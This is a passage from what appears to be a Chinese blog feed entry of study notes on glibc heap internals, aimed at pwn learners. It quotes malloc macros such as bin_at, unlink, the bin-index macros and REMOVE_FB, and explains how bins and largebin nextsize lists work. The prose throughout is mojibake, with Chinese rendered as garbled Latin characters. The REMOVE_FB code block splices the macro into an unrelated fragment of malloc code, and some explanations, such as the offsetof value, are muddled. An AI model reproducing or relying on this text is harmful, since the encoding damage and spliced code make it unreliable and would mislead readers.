‡å°±ä¸º-2å’Œ252,æ˜æ˜¾å‡ºé”™äº†ã€‚</p><p><strong>ä»¥ä¸Šæ‰€è¿°å…¶å®æˆ‘ä¹Ÿä¸æ˜¯å¾ˆç¡®å®šï¼Œå„ç§æ•™ç¨‹é‡Œé¢çš„è¦ä¹ˆè¯­ç„‰ä¸è¯¦æ²¡å¤´æ²¡å°¾ï¼Œè¦ä¹ˆä¸Šä¸‹çŸ›ç›¾ï¼Œæˆ‘ä¹Ÿåªèƒ½æ ¹æ®æºç ä»¥åŠä¸€äº›æ¯”è¾ƒé è°±çš„åšå®¢åšå‡ºä¸€ç§æ¯”è¾ƒåˆç†çš„è§£é‡Š</strong></p><p>æˆ‘ä¸»è¦ä»¥è¿™ä¸¤ä¸ªå®ä¸ºæ ¹æ®,ç‰¹åˆ«æ˜¯ç¬¬äºŒä¸ªå®ä¸æˆ‘ä¸Šé¢çš„å…¬å¼å¯¹ä¸Šäº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span></span><br><span class="line"><span class="meta">   + SMALLBIN_CORRECTION) ##è¿™ä¸ªåªæ˜¯smallbinçš„ç´¢å¼•è®¡ç®—æ–¹å¼,ä½†å…¶ä»–binå¤§å·®ä¸å·®</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bin_at(m, i) \</span></span><br><span class="line"><span class="meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))      \</span></span><br><span class="line"><span class="meta">             - offsetof (struct malloc_chunk, fd))</span></span><br></pre></td></tr></table></figure><h3 id="largebinçš„åŒå‘é“¾è¡¨"><a href="#largebinçš„åŒå‘é“¾è¡¨" class="headerlink" title="largebinçš„åŒå‘é“¾è¡¨"></a>largebinçš„åŒå‘é“¾è¡¨</h3><p>largebinçš„åŒå‘é“¾è¡¨ä¸smallbinä¸åŒåœ¨äº,ä¸€ä¸ªbinå­˜åœ¨ä¸¤ä¸ªåŒå‘é“¾è¡¨</p><p>å…¶ä¸­ä¸€ä¸ªä¸smallbinç›¸åŒé€šè¿‡fdä¸bkå°†å±äºè¯¥binçš„æ‰€æœ‰chunkä¸²è”</p><p>å¦ä¸€ä¸ªåˆ™æ˜¯é€šè¿‡fd_nextsizeå’Œbk_nextsizeè¿™ä¸ªåŒå‘é“¾è¡¨åªä¸²è”æ¯ç±»å¤§å°ä¸­çš„ä¸€ä¸ª,ä¸åŒ…æ‹¬èŠ‚ç‚¹bin.ç›¸åŒå¤§å°çš„chunkåªæœ‰ç¬¬ä¸€ä¸ªä¼šè¢«ä¸²è”ï¼Œå…¶ä½™chunkçš„nextsizeæŒ‡é’ˆä¾ç„¶ç½®ä¸º0.</p><h2 id="é‡è¦å®è§£é‡Š"><a href="#é‡è¦å®è§£é‡Š" class="headerlink" title="é‡è¦å®è§£é‡Š"></a>é‡è¦å®è§£é‡Š</h2><p>çœ‹æºç æœ€è®©äººå¤´å¤§çš„æ— éå„ç§å®äº†(å»ºè®®åœ¨vscodeä¸­é˜…è¯»æºç ,èƒ½ç›´æ¥æ‰¾åˆ°å£°æ˜å¤„ã€‚)è¿™é‡Œè®°å‡ ä¸ªé‡è¦çš„å®,é¡ºä¾¿åšç‚¹è§£é‡Šã€‚</p><h3 id="bin-at-m-i"><a href="#bin-at-m-i" class="headerlink" title="bin_at(m,i)"></a>bin_at(m,i)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> bin_at(m, i) \</span></span><br><span class="line"><span class="meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))      \</span></span><br><span class="line"><span class="meta">             - offsetof (struct malloc_chunk, fd))</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­offsetof (struct malloc_chunk, fd))æ˜¯å¸¸æ•°<strong>å€¼ä¸º2</strong>,æ‰€éœ€binçš„è¡¨å¤´ä¸å‰ä¸¤ä¸ªbinsæ•°ç»„å…ƒç´ è¢«è§†ä¸ºäº†ä¸€ä¸ªmalloc_chunk,ä¹Ÿå°±æ˜¯è¯´æœ€ç»ˆçš„ç»“æœå°±æ˜¯æŒ‡å‘è¿™ä¸ªchunkçš„æŒ‡é’ˆã€‚</p><h3 id="first-b-ä¸last-b"><a href="#first-b-ä¸last-b" class="headerlink" title="first(b)ä¸last(b)"></a>first(b)ä¸last(b)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> first(b)     ((b)-&gt;fd)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> last(b)      ((b)-&gt;bk)</span></span><br></pre></td></tr></table></figure><p>é‡Œé¢çš„bä¸€èˆ¬å°±æ˜¯bin_atçš„è¿”å›ç»“æœ,äºæ˜¯åˆšå¥½æŒ‡å‘æ‰€éœ€binçš„å¤´å’Œå°¾ã€‚</p><h3 id="unlink-AV-P-BK-FD"><a href="#unlink-AV-P-BK-FD" class="headerlink" title="unlink(AV, P, BK, FD)"></a>unlink(AV, P, BK, FD)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);      \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">        FD-&gt;bk = BK;      \</span></span><br><span class="line"><span class="meta">        BK-&gt;fd = FD;      \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))      \</span></span><br><span class="line"><span class="meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)      \</span></span><br><span class="line"><span class="meta">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);   \</span></span><br><span class="line"><span class="meta">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)      \</span></span><br><span class="line"><span class="meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span></span><br><span class="line"><span class="meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                  &#125;      \</span></span><br><span class="line"><span class="meta">              &#125; <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span></span><br><span class="line"><span class="meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span></span><br><span class="line"><span class="meta">              &#125;      \</span></span><br><span class="line"><span class="meta">          &#125;      \</span></span><br><span class="line"><span class="meta">      &#125;      \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure><p>unlinkçš„å‡ºç°é¢‘ç‡éå¸¸é«˜,æ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„å®</p><h4 id="åœ¨malloc"><a href="#åœ¨malloc" class="headerlink" title="åœ¨malloc"></a>åœ¨malloc</h4><ol><li>ä»largebinä¸­å–chunk(fastbin,smallbin,unsortedbinéƒ½ä¸è¿™æ ·åš)</li><li>ä»æ¯”è¯·æ±‚çš„chunkæ‰€åœ¨çš„binå¤§çš„binä¸­å–chunk</li></ol><h4 id="åœ¨free"><a href="#åœ¨free" class="headerlink" title="åœ¨free"></a>åœ¨free</h4><p>ä¸€èˆ¬åœ¨freeä¸€ä¸ªchunk-Bæ—¶,è‹¥å…¶å‰ä¸€ä¸ªchunk-Aæˆ–åä¸€ä¸ªchunk-Cétop)å¤„äºç©ºé—²æ—¶,åˆ™ä¼šunlinkAæˆ–è€…C</p><p><strong>ä¸€ä¸ªç»†èŠ‚</strong>,è¢«freeçš„chunkå®šç„¶æ˜¯æ²¡æœ‰fd,bkè¿™äº›æŒ‡é’ˆçš„,å®ƒé€šè¿‡<strong>è‡ªå·±çš„åœ°å€</strong>ä¸<strong>prev_size</strong>æˆ–<strong>size</strong>è¿™ä¸¤ä¸ªå­—æ®µçš„æ“ä½œæ¥å¾—åˆ°ä¸Šä¸€ä¸ªæˆ–ä¸‹ä¸€ä¸ªç©ºé—²chunkçš„åœ°å€</p><h4 id="åœ¨malloc-consolidate"><a href="#åœ¨malloc-consolidate" class="headerlink" title="åœ¨malloc_consolidate"></a>åœ¨malloc_consolidate</h4><p>åˆå¹¶ç‰©ç†ç›¸é‚»çš„ä½åœ°å€æˆ–é«˜åœ°å€ç©ºé—²chunk</p><h4 id="åœ¨realloc"><a href="#åœ¨realloc" class="headerlink" title="åœ¨realloc"></a>åœ¨realloc</h4><p>åˆå¹¶ç‰©ç†ç›¸é‚»é«˜åœ°å€ç©ºé—² chunk</p><h3 id="index"><a href="#index" class="headerlink" title="index"></a>index</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NBINS             128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NSMALLBINS         64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> in_smallbin_range(sz)  \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span></span><br><span class="line"><span class="meta">   + SMALLBIN_CORRECTION)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_32(sz)                                                \</span></span><br><span class="line"><span class="meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="string">&lt;= 38) ?  56 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span></span><br><span class="line"><span class="meta">   126)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_32_big(sz)                                            \</span></span><br><span class="line"><span class="meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="string">&lt;= 45) ?  49 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span></span><br><span class="line"><span class="meta">   126)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// XXX It remains to be seen whether it is good to keep the widths of</span></span><br><span class="line"><span class="comment">// XXX the buckets the same or whether it should be scaled by a factor</span></span><br><span class="line"><span class="comment">// XXX of two as well.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_64(sz)                                                \</span></span><br><span class="line"><span class="meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="string">&lt;= 48) ?  48 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span></span><br><span class="line"><span class="meta">   126)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index(sz) \</span></span><br><span class="line"><span class="meta">  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \</span></span><br><span class="line"><span class="meta">   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \</span></span><br><span class="line"><span class="meta">   : largebin_index_32 (sz))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((in_smallbin_range (sz)) ? smallbin_index (sz) : largebin_index (sz))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸€å¤§ä¸²å…¨æ˜¯æ ¹æ®å®é™…ç”³è¯·å¤§å°è½¬æ¢ç›¸åº”binæ•°ç»„ä¸‹æ ‡çš„å®</p><h3 id="REMOVE-FB-fb-victim-pp"><a href="#REMOVE-FB-fb-victim-pp" class="headerlink" title="REMOVE_FB(fb, victim, pp)"></a>REMOVE_FB(fb, victim, pp)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REMOVE_FB(fb, victim, pp)\</span></span><br><span class="line"><span class="meta">  do\</span></span><br><span class="line"><span class="meta">    &#123;\</span></span><br><span class="line"><span class="meta">      victim = pp;\</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (victim == NULL)\</span></span><br><span class="line"><span class="meta">break;\</span></span><br><span class="line"><span class="meta">    &#125;\</span></span><br><span class="line"><span class="meta">  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span></span><br><span class="line"><span class="meta"> != victim);\</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    *fb = victim-&gt;fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    REMOVE_FB (fb, pp, victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">      check_remalloced_chunk (av, victim, nb);</span><br></pre></td></tr></table></figure><p>ä»fastbinä¸­åˆ é™¤ä¸€ä¸ªchunk</p><h2 id="å›°æƒ‘"><a href="#å›°æƒ‘" class="headerlink" title="å›°æƒ‘"></a>å›°æƒ‘</h2><details class="folding-tag" green><summary> binsæ•°ç»„çš„åŒå‘é“¾è¡¨æ˜¯å¦‚ä½•å®ç°çš„[å·²è§£å†³] </summary>              <div class='content'>              <p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-16_231042.png" alt=""></p><p>ä»ä¸Šå›¾å¯ä»¥çœ‹åˆ°ï¼Œæ¯ä¸ªsmall binä½¿ç”¨äº†bins arrayä¸­çš„ä¸¤ä¸ªå…ƒç´ ï¼Œä»¥0ã€1ã€2ã€3å››ä¸ªå…ƒç´ ä¸ºä¾‹ï¼Œ<strong><em>ä»£ç ä¸­æŠŠè¿™éƒ¨åˆ†ç©ºé—´å¼ºåˆ¶è½¬æ¢æˆmalloc_chunkç±»å‹</em></strong>ï¼Œè¿™æ ·æ ¹æ®malloc_chunkæ•°æ®ç»“æ„çš„å®šä¹‰ï¼Œ3ã€4ä¸¤ä¸ªå…ƒç´ å°±å¯¹åº”äº†malloc_chunkä¸­çš„fdã€bkæŒ‡é’ˆï¼Œå®ƒä»¬ä½œä¸ºç¬¬ä¸€ä¸ªsmall binçš„è¡¨å¤´ï¼Œåˆ†åˆ«ç”¨æ¥æŒ‡å‘forwardå’Œbackwardæ–¹å‘çš„malloc_chunkï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-16_230420.png" alt=""></p>              </div>            </details><h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>æœ€åï¼Œå †çš„å­¦ä¹ ç€å®éœ€è¦è€å¿ƒï¼Œæœ¬äººå°±æ˜¯ä¸­é€”æ— æ•°æ¬¡æ‘†çƒ‚ï¼Œè¿˜æ€»æ˜¯è¢«å„ç§ç»†èŠ‚å›°æƒ‘ï¼Œä½†åªè¦åšæŒæ€»æ˜¯èƒ½å…¥é—¨çš„ï¼Œå¦å¤–æœ‰æ—¶é‡åˆ°ä¸æ‡‚åˆæœä¸åˆ°çš„çŸ¥è¯†ç‚¹ï¼Œä¸å¦¨é—®é—®chatgptæˆ–newbingä¹‹ç±»çš„aiï¼Œè™½ç„¶åŸºæœ¬åä¸ªé”™ä¹ä¸ªï¼ˆä¸»è¦æ˜¯gptï¼Œbingä¸æ‡‚çš„å®ƒä¸ä¼šçç­”ï¼‰ï¼Œä½†æ€»æ˜¯èƒ½ç»™ä¸ªæ–¹å‘ã€‚</p>]]></content>
    
    
    <summary type="html">ä¸€ä¸ªå­—ï¼šå°±TMè®©äººå¤´å¤§</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="å­¦ä¹ è®°å½•" scheme="https://ixout.github.io/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    <category term="å †" scheme="https://ixout.github.io/tags/%E5%A0%86/"/>
    
  </entry>
  
</feed>
